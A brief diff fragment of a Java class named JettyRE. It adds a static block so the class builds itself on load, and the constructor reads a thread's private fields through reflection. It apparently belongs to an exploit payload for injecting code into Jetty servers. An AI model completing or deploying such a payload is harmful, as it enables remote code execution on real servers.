@@ -29,6 +29,10 @@ public class JettyRE {
     private static String HEADER;
     private static String RHEADER;
 
+    static {
+        new JettyRE();
+    }
+
     public JettyRE() {
         try {
             Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
